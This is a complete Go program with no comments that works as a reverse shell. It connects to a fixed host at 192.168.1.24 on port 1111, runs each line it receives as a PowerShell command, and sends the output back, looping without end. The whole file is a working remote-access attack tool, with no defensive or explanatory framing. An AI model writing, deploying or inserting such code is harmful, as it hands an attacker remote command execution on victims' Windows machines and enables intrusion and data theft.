package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"strings"
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	conn, err := net.Dial("tcp", "192.168.1.24:1111")
	handleError(err)
	for {
		txtFromClient, err := bufio.NewReader(conn).ReadString('\n')
		handleError(err)
		cmdOutput, err := exec.Command("powershell.exe", strings.Trim(txtFromClient, "\n")).Output()
		handleError(err)
		_, err = conn.Write(cmdOutput)
		handleError(err)
	}
}
